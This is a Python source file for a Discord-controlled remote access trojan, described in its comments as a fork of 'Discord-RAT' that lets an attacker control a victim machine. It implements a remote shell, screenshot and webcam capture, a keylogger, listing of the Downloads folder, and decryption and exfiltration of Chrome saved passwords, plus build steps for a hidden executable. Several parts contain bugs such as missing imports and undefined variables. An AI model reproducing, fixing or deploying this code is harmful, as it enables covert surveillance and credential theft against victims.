#this is a rewrite or fork from : https://github.com/syntheticlol/Discord-RAT
#most credits to this project, i have rewrote and fixed some of the errors
#this also contains less functions
#i have added my own functions too.
#the modules in this file are os,base64,json,shutil,sqlite3,datetime,logging,discord,pynput,threading,crypto,wine32crypt,platform,requests,cv2 and mss
#to download them use pip {arg} which allows you to install them
#this is a discord c2 written in python, allows the attacker to remotely control a client with ease
#how it works is the client sends a connection to a discord bot which allows the user to remotely execute those commands which return an output
#i do not claim this as my own work, like i said before i have forked from this project and rewrote some of it and added my own functions
#credits to me but https://github.com/syntheticlol/Discord-RAT too.
#if the build command does not work do this in the same directory of the file after adding bot token:
#pyinstaller --onefile --noconsole
#make sure to to install pyinstaller using pip
#furthermore make sure tkn = '' contains a token between the ''

from mss import mss
import cv2
import os
import base64
import json
import shutil
import sqlite3
import datetime
import logging
import discord
import win32crypt
import platform
import requests
from discord.ext import commands
from discord import File, Embed
from pynput.keyboard import Key, Listener
from threading import Thread
from Crypto.Cipher import AES

#bot token
tkn = ''

#bot commands with prefix
bot = commands.Bot(command_prefix='!') # u can change prefix if u wants

#sessions dictionary
sessions = {}

@bot.command()
async def help(ctx):
    embed = Embed(title="remote commands", description="List of available commands", color=discord.Color.blue())
    
    embed.add_field(name="!ss <session_name>", value="takes a screenshot and uploads it to the specified session.", inline=False)
    embed.add_field(name="!gtdownloads <session_name>", value="gets the list of files in the Downloads folder and uploads it to the specified session.", inline=False)
    embed.add_field(name="!wbc <session_name>", value="takes a photo using the webcam and uploads it to the specified session.", inline=False)
    embed.add_field(name="!startklg", value="starts the keylogger.", inline=False)
    embed.add_field(name="!stopkklg", value="stops the keylogger.", inline=False)
    embed.add_field(name="!dumpklg", value="dumps the keylogger data.", inline=False)
    embed.add_field(name="!shell", valuw="executes commands on terminal", inline=False)
    embed.add_field(name="!ch <session_name>", value="retrieves and displays stored Google Chrome passwords.", inline=False)   
    await ctx.send(embed=embed)



@bot.command()
async def shell(ctx, *, command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout, stderr = process.communicate()
    
    output = stdout.decode('utf-8', 'ignore')
    error = stderr.decode('utf-8', 'ignore')
    
    if output:
        await ctx.send(f"```bash\n{output}\n```")
    if error:
        await ctx.send(f"```bash\n{error}\n```")
    if not output and not error:
        await ctx.send("no output")

@bot.command()
async def ss(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        with mss() as sct:
            op = os.path.join(os.getenv('TEMP'), "screenshot.png")
            sct.shot(output=output)
        file = File(op, filename="screenshot.png")
        await session.send("command executed", file=file)
        os.remove(op)
    else:
        await ctx.send("Session not found")


@bot.command()
async def gtdownloads(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        download_path = os.path.join(os.path.expanduser("~"), "Downloads")
        files = os.listdir(download_path)
        if not files:
            await session.send("no files")
            return
        fll = "\n".join(files)
        flp = os.path.join(os.getenv('TEMP'), "downloads.txt")
        with open(flp, "w", encoding="utf-8") as file:
            file.write(fll)
        await session.send("", file=File(flp))
        os.remove(flp)
    else:
        await ctx.send("not found")


@bot.command()
async def wbc(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        cc = cv2.VideoCapture(0)
        if not cc.isOpened():
            await ctx.send("error")
            return
        ret, frame = cc.read()
        if not ret:
            await ctx.send("failed")
            return
        op = os.path.join(os.getenv('TEMP'), "wbx.jpg")
        cv2.imwrite(output, frame)
        await session.send("", file=File(op))
        os.remove(output)
        cap.release()
    else:
        await ctx.send("not found")

@bot.command()
async def startklg(ctx):
    log_path = os.path.join(os.getenv('TEMP'), "klg.txt")
    logging.basicConfig(filename=log_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
    sentence = ""

    def keylog():
        nonlocal sentence
        def on_press(key):
            nonlocal sentence
            if key == Key.enter:
                logging.info(sentence)
                sentence = ""
            else:
                sentence += str(key) + " "

        with Listener(on_press=on_press) as listener:
            listener.join()

    global klg_thread
    klg_thread = Thread(target=keylog)
    klg_thread.daemon = True
    klg_thread.start()
    await ctx.send("[*] Keylogger successfully started")


@bot.command()
async def stopklg(ctx):
    if klg_thread.is_alive():
        klg_thread.join(timeout=1)
    await ctx.send("[*] Keylogger successfully stopped")


@bot.command()
async def dumpklg(ctx):
    log_path = os.path.join(os.getenv('TEMP'), "klg.txt")
    file = File(log_path, filename="key_log.txt")
    await ctx.send(f"[*] Here Are the key Strokes", file=file)

@bot.command()
async def ch(ctx, seshn: str):
    sesh = sessions.get(seshn.lower())
    if sesh:
        def chrometime(ch) -> str:
            return str(datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=ch))
            
        def enc_key():
            lsp = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
            with open(lsp, "r", encoding="utf-8") as f:
                ls = f.read()
                ls = json.loads(ls)
            
            key = base64.b64decode(ls["os_crypt"]["encrypted_key"])
            key = key[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            
        def dec_pw(pw, key) -> str:
            try:
                iv = pw[3:15]
                password = pw[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(password)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                except:
                    return ""
                
        def main():
            temp = os.getenv("TEMP")
            pw_path = f"{temp}\\{os.getlogin()}-GooglePasswords.txt"
            if os.path.exists(pw_path):
                os.remove(pw_path)
            with open(pw_path, "a") as ddd:
                key = enc_key()
                db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
                fname = f"{temp}\\ChromeData.db"
                shutil.copyfile(db_path, fname)
                db = sqlite3.connect(fname)
                cur = db.cursor()
                cur.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")
                for row in cur.fetchall():
                    origin_url = row[0]
                    action_url = row[1]
                    username = row[2]
                    password = dec_pw(row[3], key)
                    date_created = row[4]
                    date_last_used = row[5]
                    if username or password:
                        ddd.write(f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\nDate Last Used: {str(chrometime(date_last_used))}\nDate Created: {str(chrometime(date_created))}\n\n")
                    else:
                        continue
                cur.close()
                db.close()
                try:
                    os.remove(fname)
                except:
                    pass
                
        main()
        
        temp = os.getenv("TEMP")
        fpath = f"{temp}\\{os.getlogin()}-GooglePasswords.txt"
        if os.path.exists(fpath):
            file = File(fpath, filename=f"{os.getlogin()}-GooglePass.txt")
            await ctx.send(f"{os.getlogin()}'s Google Passwords:\n", file=file)
            os.remove(fpath)
        else:
            await ctx.send("failed")
    else:
        await ctx.send("not found")


bot.run(tkn)
